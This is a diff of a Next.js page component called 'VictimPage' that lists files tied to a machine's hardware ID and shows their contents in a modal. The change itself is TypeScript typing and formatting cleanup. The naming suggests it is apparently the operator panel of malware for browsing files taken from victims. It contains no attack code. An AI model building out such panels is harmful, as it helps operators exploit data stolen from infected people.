@@ -3,14 +3,24 @@ import { NextPage } from "next";
 import { useRouter } from "next/router";
 import { useEffect, useState } from "react";
 
+interface FileInfo {
+  name: string
+  info: any
+}
+
+interface Show {
+  name: string
+  content: any
+}
+
 const VictimPage: NextPage = () => {
   const router = useRouter();
   const { hwid } = router.query;
   const [filesInfos, setFilesInfos] = useState([]);
-  const [showFile, setShowFile] = useState(null);
-  const filesCard = filesInfos.map(fileInfo =>
-    <Card withBorder m="md" p="lg">
-      <Card.Section pb="md" style={{lineHeight: 1, display: 'block', justifyContent: 'center'}}>
+  const [showFile, setShowFile] = useState<Show>();
+  const filesCard = filesInfos.map((fileInfo: FileInfo, index) =>
+    <Card key="head" withBorder m="md" p="lg">
+      <Card.Section pb="md" style={{ lineHeight: 1, display: 'block', justifyContent: 'center' }}>
         {/* <Group spacing={30} position="center"> */}
         <Group position="center">
           <Text size="lg">File name:</Text>
@@ -59,23 +69,20 @@ const VictimPage: NextPage = () => {
 
   return (
     <div>
-      {showFile && 
+      {showFile &&
         <Modal
           title={showFile.name}
           opened={showFile != null}
-          onClose={() => {setShowFile(null)}}
+          onClose={() => { setShowFile(undefined) }}
           size="55%"
-          >
-          <Text style={{whiteSpace: "pre-line"}}>{showFile.content}</Text>
+        >
+          <Text style={{ whiteSpace: "pre-line" }}>{showFile.content}</Text>
         </Modal>
       }
       <SimpleGrid cols={6}>
         {filesCard}
       </SimpleGrid>
     </div>
-    /* <div> */
-    /*   Coucou {hwid} {filesNames} */
-    /* </div> */
   )
 }
 
